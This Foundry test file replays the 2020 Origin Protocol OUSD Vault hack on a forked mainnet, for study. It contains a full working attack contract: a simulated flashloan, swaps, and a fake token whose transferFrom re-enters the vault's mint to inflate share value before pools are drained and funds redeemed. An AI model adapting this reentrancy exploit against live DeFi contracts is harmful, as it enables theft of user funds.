// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

// Foundry
//import {console} from "forge-std/Console.sol";

// Local Interfaces
import {IOUSDVault} from "src/interfaces/IOUSDVault.sol";

// Local Libraries
import {Constants} from "src/utils/Constants.sol";

// Base for tests
import {Contracts} from "src/utils/Contracts.sol";
import {Base_Test_} from "src/Base.sol";

/**
 * KeyInfo - Total Lost :       5m$
 * Protocol Attacked:           Origin protocol (https://www.originprotocol.com/)
 * Attacker:                    0xb77f7BBAC3264ae7aBC8aEDf2Ec5F4e7cA079F83
 * Attack Contract:             0x47C3d84394043a4f42F6422AcCD27bB7240FDFE2
 * Vulnerable Contract:         0x277e80f3E14E7fB3fc40A9d6184088e0241034bD (OUSD Vault)
 * Attack tx:                   0xe1c76241dda7c5fcf1988454c621142495640e708e3f8377982f55f8cf2a8401
 * Attack block:                11272255
 * Vulnerable Contract Code:    https://github.com/OriginProtocol/origin-dollar/blob/81431fd3b2aa4c518ffc389844f9708c00b516f0/contracts/contracts/vault/VaultCore.sol
 *
 * Analysis
 * Post-mortem:
 * Twitter Guy:
 * Hacking God:
 *
 * Explanation:
 * The attacker exploited the mintMultiple function of the OUSD Vault contract to reentrancy the contract and inflate the shared value.
 * 1. The attacker flashloaned 70,000 ETH
 * 2. The attacker swapped 17,500 ETH to USDT and 52,500 ETH to DAI
 * 3. The attacker rebaseOptIn his attack contract, to ensure that OUSD in the attack contract are considered in the rebase
 * 4. The attacker minted 7,500,000 OUSD with USDT legitimately (nothing wrong here)
 * 5. The attacker minted OUSD with multiple tokens:
 * 5.a With 20,500,000 DAI and 0 malicious token
 * 5.b On mintMultiple, priceAdjusted is calculated and there is no check on the malicious token. It should have reverted if the token is not whitelisted!
 * 5.c Then first rebase happens, no tokens are transfered at the moment, so nothing happens atm, everything is ok.
 * 5.d The vault transfer 20,500,000 DAI (everything is ok here)
 * 5.e The vault transfer 0 malicious token, but this is a MALICIOUS CALL!
 * 5.f The call on the malicious token is reentrancy, and the attacker reentrant in mintMultiple to mint 2,000 OUSD with USDT.
 * 5.f.1 On the reentrancy, the vault rebase again, but this time the 20,500,000 DAI are considered as benefice from the vault!!!
 *          This increase the value of the previous minted 7,500,000 OUSD!!!
 * 5.f.2 The vault mint 2,000 OUSD with USDT
 * 5.f.3 End of the reentrancy.
 * 5.g The vault mint 20,500,000 OUSD.
 * 6. Thanks to the rebase on the reentrancy, the atttacker profit from the fake vault value increase, as he previously minted 7,500,000 OUSD with USDT.
 * 7. This allow the attacker to have approx. 39m OUSD, while the total value on the vault is 35m OUSD and total supply is 55m OUSD.
 *          The difference is the 20,500,000 DAI considered as benefice from the vault.
 * 8. The attacker emptied Uniswap and SushiSwap pools, and redeemed 33m OUSD (which emptied the strategies in the vault).
 * 9. The attacker swapped the remaining tokens to ETH and repaid the flashloan.
 * 10. The attacker made a profit of 9k ETH (≈4m$) , 1m DAI (=1m$) and 5m OUSD (worthless).
 */
contract Hack_OUSD is Base_Test_ {
    //////////////////////////////////////////////////////
    /// --- CONSTANTS & IMMUTABLES
    //////////////////////////////////////////////////////
    uint256 public constant ATTACK_AMOUNT = 70_000 ether;
    uint256 public constant ATTACK_BLOCK_NUMBER = 11272255;

    address public immutable ATTACKER = makeAddr("Attacker");
    address public constant OUSD_VAULT_IMPL = 0x328d15F6B5Eba1C30CDe1A5F1f5A9E35b07f5424;
    IOUSDVault public constant OUSD_VAULT = IOUSDVault(0x277e80f3E14E7fB3fc40A9d6184088e0241034bD);

    //////////////////////////////////////////////////////
    /// --- ATTACK CONTRACT
    //////////////////////////////////////////////////////
    Attack_Contract public attackContract;

    //////////////////////////////////////////////////////
    /// --- SETUP
    //////////////////////////////////////////////////////
    function setUp() public override {
        super.setUp();

        // Create a fork of the mainnet
        vm.createSelectFork("mainnet", ATTACK_BLOCK_NUMBER - 1);

        // Deploy the attack contract
        attackContract = new Attack_Contract();

        // Label remaining contracts
        vm.label(address(OUSD_VAULT), "OUSD_VAULT");
        vm.label(OUSD_VAULT_IMPL, "OUSD_VAULT_IMPL");
        vm.label(address(attackContract), "ATTACK_CONTRACT");
    }

    //////////////////////////////////////////////////////
    /// --- TEST_HACK
    //////////////////////////////////////////////////////
    function test_OriginProtocol_Attack_2020_11_17() public {
        // Simulate flashloan
        deal(address(WETH), address(attackContract), ATTACK_AMOUNT);

        // Get ETH from WETH
        vm.startPrank(ATTACKER);
        attackContract.attack();
        vm.stopPrank();

        // Console all balances after attack
        /*
        console.log("\n------ After the attack ------");
        console.log("Balance OUSD attacker: %e", OUSD.balanceOf(address(attackContract)));
        console.log("Balance USDT attacker: %e", USDT.balanceOf(address(attackContract)));
        console.log("Balance USDC attacker: %e", USDC.balanceOf(address(attackContract)));
        console.log("Balance DAI attacker: %e", DAI.balanceOf(address(attackContract)));
        console.log("Balance WETH attacker: %e", WETH.balanceOf(address(attackContract)));
        console.log("Balance ETH attacker: %e", address(attackContract).balance);
        */
    }
}

////////////////////////////////////////////////////
/// --- ATTACK CONTRACT
////////////////////////////////////////////////////
contract Attack_Contract is Contracts {
    IOUSDVault public constant OUSD_VAULT = IOUSDVault(0x277e80f3E14E7fB3fc40A9d6184088e0241034bD);

    uint256 public constant ATTACK_AMOUNT = 70_000 ether;
    uint256 public constant ATTACK_BLOCK_NUMBER = 11272255;

    event ReentrancyGreetings(string message);
    event log_named_uint256(string name, uint256 value);

    receive() external payable {}

    function attack() public {
        WETH.withdraw(ATTACK_AMOUNT);

        // Swap ETH to USDT on Uniswap V2
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDT);
        UNISWAP_ROUTER.swapExactETHForTokens{value: 17_500.0 ether}(1, path, address(this), block.timestamp + 1);

        // Swap ETH to DAI on Uniswap V2
        path[0] = address(WETH);
        path[1] = address(DAI);
        UNISWAP_ROUTER.swapExactETHForTokens{value: 52_500.0 ether}(1, path, address(this), block.timestamp + 1);

        // Rebase OUSD othewise we miss the rebase increase
        OUSD.rebaseOptIn();

        // Mint OUSD with USDT (nothing wrong here)
        USDT.approve(address(OUSD_VAULT), Constants.MAX_UINT256);
        OUSD_VAULT.mint(address(USDT), 7_500_000 * 1e6);

        // Mint multiple OUSD with DAI and malicious token
        // --- Start of the attack ---
        path[0] = address(DAI);
        path[1] = address(this);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 20_500_000 ether;
        amounts[1] = 0;
        DAI.approve(address(OUSD_VAULT), Constants.MAX_UINT256);
        OUSD_VAULT.mintMultiple(path, amounts);
        // --- End of the attack ---
        //emit log_named_uint256("OUSD total supply after mint multiple", OUSD.totalSupply()); // 55,520,199.517441762179098939
        //emit log_named_uint256("OUSD owned by the attacker", OUSD.balanceOf(address(this))); // 39,792,409.289583695753119025
        //emit log_named_uint256("OUSD total value after mint multiple", OUSD_VAULT.totalValue()); // 35,020,199.517441762179098939 (i.e. 20,500,000 less than the total supply)

        // Swap 300k OUSD to USDT on Uniswap V2
        path[0] = address(OUSD);
        path[1] = address(USDT);
        OUSD.approve(address(UNISWAP_ROUTER), Constants.MAX_UINT256);
        UNISWAP_ROUTER.swapExactTokensForTokens(300_000 ether, 1, path, address(this), block.timestamp + 1);

        // Swap 1m OUSD to USDT on ShushiSwap
        path[0] = address(OUSD);
        path[1] = address(USDT);
        OUSD.approve(address(SUSHISWAP_ROUTER), Constants.MAX_UINT256);
        SUSHISWAP_ROUTER.swapExactTokensForTokens(1_000_000 ether, 1, path, address(this), block.timestamp + 1);

        // Redeem
        OUSD.approve(address(OUSD_VAULT), Constants.MAX_UINT256);
        OUSD_VAULT.redeem(33_269_189_620024494262512727);

        // Swap remaining USDT in ETH on Uniswap V2
        path[0] = address(USDT);
        path[1] = address(WETH);
        USDT.approve(address(UNISWAP_ROUTER), Constants.MAX_UINT256);
        UNISWAP_ROUTER.swapExactTokensForETH(USDT.balanceOf(address(this)), 1, path, address(this), block.timestamp + 1);

        // Swap remaining USDC in ETH on Uniswap V2
        path[0] = address(USDC);
        path[1] = address(WETH);
        USDC.approve(address(UNISWAP_ROUTER), Constants.MAX_UINT256);
        UNISWAP_ROUTER.swapExactTokensForETH(USDC.balanceOf(address(this)), 1, path, address(this), block.timestamp + 1);

        // Swap remaining DAI in ETH on Uniswap V2
        path[0] = address(DAI);
        path[1] = address(WETH);
        DAI.approve(address(UNISWAP_ROUTER), Constants.MAX_UINT256);
        UNISWAP_ROUTER.swapExactTokensForETH(
            DAI.balanceOf(address(this)) - 1_000_000 ether, 1, path, address(this), block.timestamp + 1
        );

        // Repay the flashloan
        WETH.deposit{value: ATTACK_AMOUNT}();
        WETH.transfer(address(0), ATTACK_AMOUNT);
    }

    // Malicious function that reentrancy the OUSD Vault and inflate shared value
    function transferFrom(address, address, uint256) public {
        emit ReentrancyGreetings("Really happy to see you here!");
        //emit log_named_uint256("OUSD total supply before rebase", OUSD.totalSupply()); //         14,518,199.517441762179098939
        //emit log_named_uint256("OUSD total value before rebase", OUSD_VAULT.totalValue()); //     35,018,199.517441762179098939
        OUSD_VAULT.mint(address(USDT), 2_000 * 1e6);
        //emit log_named_uint256("OUSD total supply after rebase", OUSD.totalSupply()); //          35,020,199.517441762179098939
        //emit log_named_uint256("OUSD total value after rebase", OUSD_VAULT.totalValue()); //      35,020,199.517441762179098939 -> 20,500,000 DAI are considered as benefice from the vault.
    }
}
